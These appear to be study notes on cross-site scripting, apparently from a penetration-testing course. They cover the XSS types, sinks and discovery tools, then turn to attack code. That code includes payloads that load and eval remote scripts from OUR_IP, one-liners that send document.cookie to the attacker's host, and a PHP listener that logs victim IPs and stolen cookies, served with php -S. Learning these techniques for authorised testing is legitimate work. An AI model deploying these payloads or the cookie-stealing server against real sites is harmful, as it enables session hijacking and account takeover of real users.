**Stored XSS**

*Identify*:`<script>alert(window.origin)</script>`,`<script>print()</script>`

**Reflected XSS:**
- Non-Persistent XSS
- Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized.
- *Identify*:`<script>alert(window.origin)</script>`,`<script>print()</script>`

**DOM XSS**

- Non-Persistent
- The `Source` is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.
- On the other hand, the `Sink` is the function that writes the user input to a DOM Object on the page. If the `Sink` function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:

- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Furthermore, some of the `jQuery` library functions that write to DOM objects are:

- `add()`
- `after()`
- `append()`

**Identify**:`<img src="" onerror=alert(window.origin)>`

## XSS Discovery

Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities.

Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser).

`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`

### Manual

We can find huge lists of XSS payloads online, like the one on PayloadAllTheThings or the one in PayloadBox

### Code Review

The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code. If we understand precisely how our input is being handled all the way until it reaches the web browser, we can write a custom payload that should work with high confidence.

# Loading a Remote Script

<script src="http://OUR_IP/script.js"></script>

```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script><script>$.getScript("http://OUR_IP")</script>
```

```
[!bash!]$ mkdir /tmp/tmpserver
[!bash!]$ cd /tmp/tmpserver
[!bash!]$ sudo php -S 0.0.0.0:80PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

```
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```

Try testing various remote script XSS payloads with the remaining input fields, and see which of them sends an HTTP request to find a working payload.

## Session Hijacking

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

```
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

We can save the following PHP script as `index.php`, and re-run the PHP server again:

```
<?phpif (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```
sudo php -S 0.0.0.0:80
```